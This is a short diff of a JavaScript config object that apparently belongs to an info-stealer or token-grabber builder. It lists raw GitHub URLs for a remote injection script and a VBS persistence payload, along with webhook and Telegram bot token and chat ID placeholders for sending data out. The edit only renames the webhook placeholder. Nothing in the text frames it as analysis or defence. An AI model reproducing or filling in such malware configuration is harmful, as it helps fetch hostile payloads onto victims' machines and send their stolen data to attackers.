@@ -23,7 +23,7 @@ var config = {
     "https://raw.githubusercontent.com/ItsZxsko/salowwww/refs/heads/main/injjjj.js",
   injector_url:
     "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/VBS_Persist.vbs",
-  webhook: "%WEBHOOK%",
+  webhook: "%WEBHOOK_URL%",
   Placed: "%API_URL%",
   bot_token: "%TELEGRAM_BOTTOKEN%",
   chat_id: "%TELEGRAM_CHATID%",
